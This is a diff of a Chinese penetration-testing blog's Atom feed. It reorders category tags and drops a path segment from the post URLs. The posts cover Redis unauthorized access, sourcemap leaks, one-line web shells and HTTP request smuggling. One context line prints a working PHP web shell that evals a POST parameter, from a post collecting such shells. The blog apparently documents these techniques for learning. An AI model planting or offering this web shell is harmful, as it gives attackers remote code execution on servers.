@@ -4,30 +4,31 @@
     <title>Milkii0的秘密花园 • Posts by &#34;渗透基础&#34; category</title>
     <link href="http://example.com" />
     <updated>2022-01-16T03:14:59.000Z</updated>
-    <category term="Java反序列化" />
-    <category term="ysoserial调试" />
-    <category term="文件上传靶场" />
     <category term="web,HTTP" />
     <category term="redis,未授权,漏洞利用" />
+    <category term="solr, 漏洞复现" />
     <category term="前后端分离" />
+    <category term="文件上传靶场" />
+    <category term="Java反序列化" />
+    <category term="ysoserial调试" />
     <category term="木马,汇总" />
     <category term="pikachu,web靶场" />
-    <category term="webgoat" />
     <category term="dorabox,靶场练习" />
     <category term="sql注入靶场" />
+    <category term="webgoat" />
     <entry>
-        <id>http://example.com/2022/01/16/stjc/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/</id>
+        <id>http://example.com/2022/01/16/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/</id>
         <title>redis未授权验证流程</title>
-        <link rel="alternate" href="http://example.com/2022/01/16/stjc/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/"/>
+        <link rel="alternate" href="http://example.com/2022/01/16/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%B5%81%E7%A8%8B/"/>
         <content type="html">&lt;h1 id=&#34;&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h1&gt;
 </content>
         <category term="redis,未授权,漏洞利用" />
         <updated>2022-01-16T03:14:59.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2021/12/03/stjc/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/</id>
+        <id>http://example.com/2021/12/03/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/</id>
         <title>sourcemap泄露获取前端源码</title>
-        <link rel="alternate" href="http://example.com/2021/12/03/stjc/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/"/>
+        <link rel="alternate" href="http://example.com/2021/12/03/sourcemap%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81/"/>
         <content type="html">&lt;p&gt;reverse-sourcemap 下载地址:&lt;a href=&#34;https://github.com/davidkevork/reverse-sourcemap&#34;&gt;https://github.com/davidkevork/reverse-sourcemap&lt;/a&gt;&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;
@@ -49,9 +50,9 @@
         <updated>2021-12-03T03:20:41.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2021/08/12/stjc/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/</id>
+        <id>http://example.com/2021/08/12/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/</id>
         <title>一句话木马整理</title>
-        <link rel="alternate" href="http://example.com/2021/08/12/stjc/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/"/>
+        <link rel="alternate" href="http://example.com/2021/08/12/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/"/>
         <content type="html">&lt;h1 id=&#34;日常系列&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#日常系列&#34;&gt;#&lt;/a&gt; 日常系列&lt;/h1&gt;
 &lt;h2 id=&#34;phtml&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phtml&#34;&gt;#&lt;/a&gt; phtml&lt;/h2&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_POST[&amp;#x27;milkii0&amp;#x27;]);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -76,9 +77,9 @@
         <updated>2021-08-12T02:53:49.000Z</updated>
     </entry>
     <entry>
-        <id>http://example.com/2021/08/03/stjc/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
+        <id>http://example.com/2021/08/03/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
         <title>HTTP请求走私简述</title>
-        <link rel="alternate" href="http://example.com/2021/08/03/stjc/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
+        <link rel="alternate" href="http://example.com/2021/08/03/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
         <content type="html">&lt;h1 id=&#34;http请求走私是什么&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http请求走私是什么&#34;&gt;#&lt;/a&gt; HTTP 请求走私是什么&lt;/h1&gt;
 &lt;p&gt;HTTP 请求走私，一种干扰网站处理来自用户的 HTTP &lt;ins class=&#34;wavy&#34;&gt;请求序列&lt;/ins&gt; 的技术&lt;/p&gt;
 &lt;h2 id=&#34;相关知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#相关知识点&#34;&gt;#&lt;/a&gt; 相关知识点&lt;/h2&gt;
